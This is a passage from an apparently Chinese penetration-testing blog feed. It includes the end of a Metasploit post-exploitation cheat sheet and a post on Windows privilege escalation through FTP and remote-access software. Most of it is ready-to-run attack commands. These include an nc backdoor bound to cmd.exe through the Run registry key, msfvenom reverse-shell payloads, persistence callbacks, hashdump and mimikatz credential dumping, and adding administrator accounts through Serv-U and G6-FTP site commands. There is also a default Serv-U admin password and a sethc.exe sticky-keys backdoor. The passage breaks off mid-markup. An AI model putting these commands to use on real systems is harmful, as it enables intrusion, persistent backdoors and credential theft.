class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure><h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p><h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;</p><p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p><p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p><p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p><p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p><p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure><p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap在内存中缓冲区块循环存储抓包（50000包），不写硬盘智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul><li>use post/windows/gather/hashdump # system 权限的 metepreter</li><li>run # 结果保存在 /tmp 目录下</li><li>use auxiliary/analyze/jtr_crack_fast</li><li>run<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code></code></pre></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;msf后渗透常见操作总结&quot;&gt;&lt;a href=&quot;#msf后渗透常见操作总结&quot; class=&quot;headerlink&quot; title=&quot;msf后渗透常见操作总结&quot;&gt;&lt;/a&gt;msf后渗透常见操作总结&lt;/h2&gt;&lt;h4 id=&quot;1-准备工作&quot;&gt;&lt;a href=&quot;#1-准备工作&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结(三)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</id>
    <published>2020-04-28T01:56:53.000Z</published>
    <updated>2020-06-05T10:16:23.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p><h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul><li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li><li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li><li>serv-u密码文件：ServUDaemon.ini</li><li>端口号：默认端口是43958<br>ServUDaemon.ini中lccalsetuportNo=端口</li></ul><h5 id="FTP提权方法"><a href="#FTP提权方法" class="headerlink" title="FTP提权方法"></a>FTP提权方法</h5><p>1、有修改权限</p><p>2、无权限修改</p><p>3、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p><p>4、serv-u ftp转发端口</p><h5 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h5><p>步骤如下：<br>1、判断是否安装serv-u<br>nmap扫端口确认<br>2、检查是否有可写权限<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini<br>3、在serv-u中添加用户<br>在user4=添加一个系统用户</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[USER=quan|<span class="number">1</span>]                                <span class="comment">//用户名</span></span><br><span class="line">Password=    <span class="comment">//用户密码加密后的密文</span></span><br><span class="line">HomeDir=c:\ftp\quan             <span class="comment">//目录</span></span><br><span class="line">RelPaths=<span class="number">3</span> </span><br><span class="line">TimeOut=<span class="number">600</span>                      <span class="comment">//超时时间设置</span></span><br><span class="line">Maintenance=System               <span class="comment">//权限</span></span><br><span class="line">Access1=C:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access2=d:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">Access3=e:\|RWAMELCDP            <span class="comment">//可访问的目录及权限</span></span><br><span class="line">SKEYValues=</span><br></pre></td></tr></table></figure><p>password=2位随机字符+md5(2位随机字符+123456)</p><p>4、连接目标FTP服务器</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ftp</span> 目标<span class="built_in">IP</span>地址 刚添加的用户密码</span><br></pre></td></tr></table></figure><p>5、利用ftp命令<code>quote site exec</code>添加用户加入administrators权限组</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site exec net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">quote site exec net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><h5 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h5><p>1、利用md5 直接去解密<br>2、默认用户名密码<br>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P<br>命令：<br>cmd /c net user quan quan123 /add &amp; net localgroup administrators quan /add<br>3、不是默认密码时<br>直接把SerUAdmin.exe 下载下来<br>用winhex打开查找LocalAdministrator（选择ANSI字符）进行查找密码</p><h5 id="serv-u-ftp本地溢出权限提升-使用6-0以及以前版本"><a href="#serv-u-ftp本地溢出权限提升-使用6-0以及以前版本" class="headerlink" title="serv-u ftp本地溢出权限提升(使用6.0以及以前版本)"></a>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</h5><p>步骤如下：<br>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下<br>比如是d盘<br>3、执行命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:\serv_u.exe</span><br><span class="line">d:\serv_u.exe “net<span class="built_in"> user </span>quan quan123 /add”</span><br><span class="line">d:\serv_u.exe “net localgroup administrators quan /add”</span><br></pre></td></tr></table></figure><p>注意命令要有引号</p><h5 id="serv-u-ftp转发端口"><a href="#serv-u-ftp转发端口" class="headerlink" title="serv-u ftp转发端口"></a>serv-u ftp转发端口</h5><p>1、lcx端口转发<br>在目标Webshell上运行LCX命令</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave yourIP <span class="number">5000</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">43958</span></span><br></pre></td></tr></table></figure><p>在本机上运行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">5000</span> <span class="number">21</span></span><br></pre></td></tr></table></figure><p>2、本机登陆Serv_U<br>打开本地的SERV_U 在IP上填入127.0.0.1<br>帐号写LocalAdministrator 密码#l@$ak#.lk;0@P</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a></p><p>这里就不写具体过程了</p><h4 id="第三方软件G6-FTP提权"><a href="#第三方软件G6-FTP提权" class="headerlink" title="第三方软件G6-FTP提权"></a>第三方软件G6-FTP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429095652.png" alt=""></p><h5 id="G6-FTP简介"><a href="#G6-FTP简介" class="headerlink" title="G6-FTP简介"></a>G6-FTP简介</h5><ul><li>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</li><li>G6-FTP的默认端口为<code>8021</code>，只侦听在127.0.0.1的8021端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</li></ul><h5 id="提权关键"><a href="#提权关键" class="headerlink" title="提权关键"></a>提权关键</h5><p>使用lcx时必须保证两个前提，肉鸡A和内网机C都能够访问到外网机B；listen监听的端口之前不能被其它程序占用。</p><h5 id="提取方法"><a href="#提取方法" class="headerlink" title="提取方法"></a>提取方法</h5><p>1、通过执行bat文件提权<br>2、通过映射bat文件提权</p><h5 id="通过执行bat文件提权"><a href="#通过执行bat文件提权" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>步骤如下</p><ul><li><p>下载配置文件<code>Remote.ini</code>，将<code>administrator</code>管理密码解密<br>用cmd5 破解</p></li><li><p>查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p></li><li><p>利用<code>lcx</code>端口转发 默认只允许本机连接</p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">8027</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8021</span></span><br></pre></td></tr></table></figure><ul><li><p>以管理员用户登录服务端<br>转发成功后，通过<code>G6-FTP</code>软件进行连接，以管理员用户登入</p></li><li><p>创建FTP用户并进行权限设置</p></li><li><p>上传批处理文件<br><code>adduser.bat</code>中的文件内容为：即新建一个用户名为<code>quan</code>的用户，并且加入到管理员组中。</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><ul><li><p>在G6-FTP软件中加入批处理命令<br>site commands-&gt; +<br>Command:ADDUSER<br>Excute:</p></li><li><p>普通用户登录ftp</p></li><li><p>执行所加入的批处理命令<br>执行命令<code>quote site adduser.bat</code></p></li></ul><h5 id="通过执行bat文件提权-1"><a href="#通过执行bat文件提权-1" class="headerlink" title="通过执行bat文件提权"></a>通过执行bat文件提权</h5><p>可用性较差<br>步骤如下<br>1、以非特权用户登录<br>2、通过添加FTP用户账户hhh<br>3、对FTP服务器添加新的site命令<br>4、新建a.bat文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan quan123 /add</span><br><span class="line">net localgroup administrators quan /add</span><br></pre></td></tr></table></figure><p>5、将a.bat文件映射到新建的site命令</p><p>6、获取system权限<br>以test用户登录ftp服务器，执行以下命令<br>ftp&gt;quote site a</p><h4 id="第三方软件FileZilla提权"><a href="#第三方软件FileZilla提权" class="headerlink" title="第三方软件FileZilla提权"></a>第三方软件FileZilla提权</h4><h5 id="FileZilla简介"><a href="#FileZilla简介" class="headerlink" title="FileZilla简介"></a>FileZilla简介</h5><ul><li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。</li><li>FileZilla的默认端口为<code>14147</code>，只侦听在127.0.0.1的14147端口上，所以无法从外部直接访问，需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。默认安装目录下有两个敏感文件<code>filezillaserver.xml</code>（包含用户信息）和<code>filezillaserverinterface.xml</code>（包含管理信息）</li></ul><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>1、下载这两个文件，拿到管理密码</p><p>2、查找该网站的可读可写目录，然后上传<code>cmd.exe</code>和<code>lcx.exe</code>到该目录下</p><p>3、利用<code>lcx</code>端口转发 默认只允许本机连接</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">14148</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">14147</span></span><br></pre></td></tr></table></figure><p>4、以管理员用户远程登录服务端程序<br>转发成功后，通过<code>FileZilla</code>软件进行连接，以管理员用户登入<br>端口为14148，密码默认为空</p><p>5、创建ftp用户并进行权限设置<br>赋予C盘读写权限</p><p>6、用刚创建的用户通过FileZilla的客户端登录ftp</p><p>7、使用<code>cmd.exe</code>改名为<code>sethc.exe</code>替换<code>C:\Windows\System32\sethc.exe</code>生成shift后门</p><p>8、远程登录<code>3389</code>,按<code>5</code>次shift调出<code>cmd.exe</code></p><p>9、添加一个用户，并将其提升为管理员权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net<span class="built_in"> user </span>quan 123 /add</span><br><span class="line">net localgroup administrator quan /add</span><br></pre></td></tr></table></figure><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p><p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p><h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol><li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li><li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li><li>替换system系统服务程序，进行提权。</li></ol><h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p><h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul><li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li></ul><h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p><h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p><p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p><p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p><h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul><li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li><li>pcAnywher的默认端口为<code>5631、5632</code>。</li><li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li></ul><h5 id="2、提权步骤"><a href="#2、提权步骤" class="headerlink" title="2、提权步骤"></a><strong>2、提权步骤</strong></h5><p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dir</span> <span class="regexp">*.cif</span>/s</span><br></pre></td></tr></table></figure><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p><p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p><h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p><h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p><h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" 